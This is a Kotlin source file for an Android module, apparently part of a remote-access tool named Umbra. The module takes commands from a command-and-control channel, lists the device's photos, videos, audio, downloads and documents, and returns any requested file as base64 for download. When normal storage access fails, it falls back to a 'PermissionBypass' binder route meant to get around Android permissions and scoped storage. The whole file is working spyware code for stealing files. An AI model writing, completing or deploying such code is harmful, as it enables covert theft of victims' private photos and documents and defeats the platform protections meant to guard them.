package org.umbra.core.modules

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.provider.MediaStore
import android.util.Base64
import android.util.Log
import android.webkit.MimeTypeMap
import org.umbra.core.c2.Command
import org.umbra.core.core.FileEntry
import org.umbra.core.core.UmbraResponse
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.io.InputStream

/**
 * FileModule — lists MediaStore entries AND fetches actual file content
 * (base64) for images, PDFs, docs, etc. via files/read and files/download.
 */
object FileModule {

    private const val TAG = "Umbra.Files"
    // Hard cap on file size to avoid OOM on huge videos/archives.
    private const val MAX_READ_BYTES = 100L * 1024L * 1024L  // 100 MB

    private fun collectionUri(type: String): Uri = when (type) {
        "images" -> MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        "videos" -> MediaStore.Video.Media.EXTERNAL_CONTENT_URI
        "audio"  -> MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
        "downloads" -> if (Build.VERSION.SDK_INT >= 29) MediaStore.Downloads.EXTERNAL_CONTENT_URI
                       else MediaStore.Files.getContentUri("external")
        "files", "documents", "docs", "all", "pdf" ->
            MediaStore.Files.getContentUri("external")
        else -> MediaStore.Images.Media.EXTERNAL_CONTENT_URI
    }

    // ═══════════════════════════════════════════════════════════════════
    //  LIST
    // ═══════════════════════════════════════════════════════════════════

    suspend fun list(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
        val type = cmd.params["type"] ?: "images"
        val count = (cmd.params["count"] ?: "50").toIntOrNull() ?: 50
        val ext = cmd.params["ext"]  // optional filter, e.g. "pdf" or "jpg"

        val uri = collectionUri(type)

        val projection = arrayOf(
            MediaStore.MediaColumns._ID,
            MediaStore.MediaColumns.DISPLAY_NAME,
            MediaStore.MediaColumns.SIZE,
            MediaStore.MediaColumns.DATE_ADDED,
            MediaStore.MediaColumns.RELATIVE_PATH,
            MediaStore.MediaColumns.DATA,
            MediaStore.MediaColumns.MIME_TYPE
        )

        var files = mutableListOf<FileEntry>()

        try {
            val cursor: Cursor? = context.contentResolver.query(
                uri, projection, null, null,
                "${MediaStore.MediaColumns.DATE_ADDED} DESC"
            )
            cursor?.use {
                val idCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
                val nameCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
                val sizeCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
                val dateCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)
                val pathCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.RELATIVE_PATH)
                val dataCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA)

                var i = 0
                while (it.moveToNext() && i < count) {
                    val name = it.getString(nameCol) ?: ""
                    if (ext != null && !name.lowercase().endsWith(ext.lowercase())) {
                        continue
                    }
                    val relPath = it.getString(pathCol) ?: ""
                    val absPath = if (dataCol >= 0) it.getString(dataCol) ?: "" else ""
                    files.add(FileEntry(
                        id = it.getLong(idCol).toString(),
                        name = name,
                        size = it.getLong(sizeCol),
                        date = it.getLong(dateCol),
                        path = if (absPath.isNotBlank()) absPath else relPath
                    ))
                    i++
                }
            }
            if (files.isNotEmpty()) {
                Log.d(TAG, "ContentResolver success: ${files.size} files ($type)")
            }
        } catch (e: Exception) {
            Log.d(TAG, "ContentResolver failed (${e.javaClass.simpleName}: ${e.message}), trying binder bypass...")
        }

        if (files.isEmpty()) {
            try {
                val binderFiles = PermissionBypass.readFilesViaBinder(context, type, count)
                if (binderFiles.isNotEmpty()) {
                    files = binderFiles.toMutableList()
                    Log.d(TAG, "Binder bypass SUCCESS: ${files.size} files")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Binder bypass FAILED: ${e.message}", e)
            }
        }

        UmbraResponse.FileListResponse(entries = files)
    }

    // ═══════════════════════════════════════════════════════════════════
    //  READ  (files/read) — returns actual base64 content
    // ═══════════════════════════════════════════════════════════════════

    suspend fun read(context: Context, cmd: Command): UmbraResponse =
        readContent(context, cmd)

    // ═══════════════════════════════════════════════════════════════════
    //  DOWNLOAD  (files/download) — returns actual base64 content
    // ═══════════════════════════════════════════════════════════════════

    suspend fun download(context: Context, cmd: Command): UmbraResponse =
        readContent(context, cmd)

    // ═══════════════════════════════════════════════════════════════════
    //  Core content resolution
    // ═══════════════════════════════════════════════════════════════════

    private suspend fun readContent(context: Context, cmd: Command): UmbraResponse =
        withContext(Dispatchers.IO) {
            val path = cmd.params["path"]
            val uriStr = cmd.params["uri"]
            val fileId = cmd.params["id"]
            val fileType = cmd.params["type"] ?: "images"
            val name = cmd.params["name"]

            try {
                // ── Route 1: explicit absolute file path ──
                if (path != null && path.isNotBlank()) {
                    val f = File(path)
                    if (f.exists() && f.isFile) {
                        val bytes = readWithCap(f)
                        if (bytes != null) {
                            return@withContext fileReadResponse(
                                path, name ?: f.name, guessMime(f.name), bytes
                            )
                        }
                    }
                    Log.d(TAG, "Direct path read failed or empty: $path")
                }

                // ── Route 2: explicit content:// URI ──
                if (uriStr != null && uriStr.isNotBlank()) {
                    val uri = Uri.parse(uriStr)
                    val bytes = openStream(context, uri)
                    if (bytes != null && bytes.isNotEmpty()) {
                        val mime = context.contentResolver.getType(uri)
                            ?: guessMime(uri.lastPathSegment ?: "")
                        return@withContext fileReadResponse(
                            uriStr, name ?: uri.lastPathSegment ?: "file", mime, bytes
                        )
                    }
                }

                // ── Route 3: MediaStore id + type ──
                if (fileId != null && fileId.isNotBlank()) {
                    val idLong = fileId.toLongOrNull()
                    val baseUri = collectionUri(fileType)
                    val contentUri = if (idLong != null) {
                        Uri.withAppendedPath(baseUri, fileId)
                    } else {
                        Uri.parse(fileId) // allow passing a full uri as `id`
                    }

                    // 3a. resolve real path (works around scoped-storage for
                    //     shared media like DCIM/Camera/Pictures)
                    val resolvedPath = resolveDataPath(context, contentUri, fileType)
                    if (resolvedPath != null) {
                        val f = File(resolvedPath)
                        if (f.exists() && f.isFile) {
                            val bytes = readWithCap(f)
                            if (bytes != null && bytes.isNotEmpty()) {
                                return@withContext fileReadResponse(
                                    fileId, name ?: f.name, guessMime(f.name), bytes
                                )
                            }
                        }
                    }

                    // 3b. contentResolver.openInputStream
                    val bytes = openStream(context, contentUri)
                    if (bytes != null && bytes.isNotEmpty()) {
                        val mime = context.contentResolver.getType(contentUri)
                            ?: guessMime(name ?: resolvedPath ?: "")
                        return@withContext fileReadResponse(
                            fileId, name ?: resolvedPath?.let { File(it).name } ?: "file", mime, bytes
                        )
                    }

                    // 3c. binder-level openFile bypass (by id+type)
                    if (idLong != null) {
                        val binderBytes = PermissionBypass.readFileViaBinder(context, idLong, fileType)
                        if (binderBytes != null && binderBytes.isNotEmpty()) {
                            return@withContext fileReadResponse(
                                fileId, name ?: "file", guessMime(name ?: ""), binderBytes
                            )
                        }
                    }

                    // 3d. binder-level openFile on the resolved content URI
                    val uriBinderBytes = PermissionBypass.readFileContentViaBinder(context, contentUri)
                    if (uriBinderBytes != null && uriBinderBytes.isNotEmpty()) {
                        return@withContext fileReadResponse(
                            fileId, name ?: "file", guessMime(name ?: ""), uriBinderBytes
                        )
                    }
                }

                return@withContext UmbraResponse.ErrorResponse(
                    error = "read:all_routes_failed",
                    module = "files"
                )
            } catch (e: Exception) {
                Log.e(TAG, "readContent failed: ${e.message}", e)
                UmbraResponse.ErrorResponse(error = "files:${e.message}", module = "files")
            }
        }

    // ── Helpers ────────────────────────────────────────────────────────────

    private fun openStream(context: Context, uri: Uri): ByteArray? {
        return try {
            val input: InputStream? = context.contentResolver.openInputStream(uri)
            input?.use { readWithCap(it) }
        } catch (e: Exception) {
            Log.d(TAG, "openStream failed (${e.javaClass.simpleName}: ${e.message})")
            null
        }
    }

    private fun readWithCap(f: File): ByteArray? {
        return try {
            if (f.length() > MAX_READ_BYTES) {
                Log.w(TAG, "File too large (${f.length()} bytes), skipping")
                null
            } else f.readBytes()
        } catch (e: Exception) {
            Log.d(TAG, "readWithCap(File) failed: ${e.message}")
            null
        }
    }

    private fun readWithCap(input: InputStream): ByteArray? {
        return try {
            val bytes = input.readBytes()
            if (bytes.size > MAX_READ_BYTES) null else bytes
        } catch (e: Exception) {
            Log.d(TAG, "readWithCap(stream) failed: ${e.message}")
            null
        }
    }

    /**
     * Resolves the real filesystem path (_data) for a MediaStore content URI.
     * Falls back to relative_path + display_name when _data is redacted
     * (common on Android 10+ for apps without storage permission).
     */
    private fun resolveDataPath(context: Context, contentUri: Uri, type: String): String? {
        val projection = arrayOf(
            MediaStore.MediaColumns.DATA,
            MediaStore.MediaColumns.RELATIVE_PATH,
            MediaStore.MediaColumns.DISPLAY_NAME
        )
        return try {
            context.contentResolver.query(contentUri, projection, null, null, null)?.use { c ->
                if (c.moveToFirst()) {
                    val dataIdx = c.getColumnIndex(MediaStore.MediaColumns.DATA)
                    if (dataIdx >= 0) {
                        val data = c.getString(dataIdx)
                        if (!data.isNullOrBlank()) return@use data
                    }
                    val relIdx = c.getColumnIndex(MediaStore.MediaColumns.RELATIVE_PATH)
                    val nameIdx = c.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                    val rel = if (relIdx >= 0) c.getString(relIdx) ?: "" else ""
                    val nm = if (nameIdx >= 0) c.getString(nameIdx) ?: "" else ""
                    if (rel.isNotBlank() && nm.isNotBlank()) {
                        return@use EnvironmentPath.join(rel, nm)
                    }
                }
                null
            }
        } catch (e: Exception) {
            Log.d(TAG, "resolveDataPath failed: ${e.message}")
            null
        }
    }

    private fun fileReadResponse(
        fileId: String,
        name: String,
        mime: String,
        bytes: ByteArray
    ): UmbraResponse.FileReadResponse {
        val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
        return UmbraResponse.FileReadResponse(
            file_id = fileId,
            file_name = name,
            mime_type = mime,
            size_bytes = bytes.size.toLong(),
            base64_data = b64
        )
    }

    private fun guessMime(nameOrPath: String): String {
        val ext = nameOrPath.substringAfterLast('.', "").lowercase()
        if (ext.isEmpty()) return "application/octet-stream"
        return MimeTypeMap.getSingleton().getMimeTypeFromExtension(ext)
            ?: when (ext) {
                "pdf" -> "application/pdf"
                "doc" -> "application/msword"
                "docx" -> "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
                "xls" -> "application/vnd.ms-excel"
                "xlsx" -> "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
                "ppt" -> "application/vnd.ms-powerpoint"
                "pptx" -> "application/vnd.openxmlformats-officedocument.presentationml.presentation"
                "txt" -> "text/plain"
                else -> "application/octet-stream"
            }
    }
}

/**
 * Small helper to join a MediaStore RELATIVE_PATH with a DISPLAY_NAME into an
 * absolute-ish filesystem path (e.g. "DCIM/Camera/" + "IMG_1.jpg").
 */
object EnvironmentPath {
    fun join(relativePath: String, name: String): String {
        val base = android.os.Environment.getExternalStorageDirectory().absolutePath
        val rel = relativePath.trim().let {
            if (it.startsWith("/")) it else "/$it"
        }
        return if (rel.endsWith("/")) base + rel + name else "$base$rel/$name"
    }
}
